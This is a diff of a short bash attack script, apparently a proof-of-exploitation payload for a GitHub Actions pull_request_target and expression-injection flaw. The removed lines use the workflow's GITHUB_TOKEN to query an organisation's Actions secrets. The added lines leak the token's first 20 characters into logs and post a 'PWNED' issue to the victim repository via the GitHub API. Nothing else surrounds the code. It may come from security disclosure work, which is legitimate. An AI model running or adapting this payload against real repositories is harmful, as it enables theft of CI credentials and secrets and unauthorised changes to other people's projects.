@@ -1,9 +1,10 @@
 #!/bin/bash
-# Attacker-controlled code running with base repo's GITHUB_TOKEN
-echo "=== PWNED: running attacker code with privileged GITHUB_TOKEN ==="
+echo "=== ATTACKER CODE EXECUTING WITH PRIVILEGED TOKEN ==="
+echo "Token: ${GITHUB_TOKEN:0:20}..."
 echo "Repo: $GITHUB_REPOSITORY"
-echo "Actor: $GITHUB_ACTOR"  
-echo "Token (first 10): ${GITHUB_TOKEN:0:10}..."
-# Attempt to list org secrets using the token
-curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" \
-  https://api.github.com/orgs/h1class/actions/secrets | head -100 || true
+# Create proof-of-exploitation issue
+curl -sf -X POST \
+  -H "Authorization: Bearer $GITHUB_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"title":"PWNED: expression injection + unsafe checkout","body":"Attacker-controlled code executed with privileged GITHUB_TOKEN via pull_request_target. Token had Issues:write and PullRequests:write on base repo."}' \
+  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" || echo "curl failed"
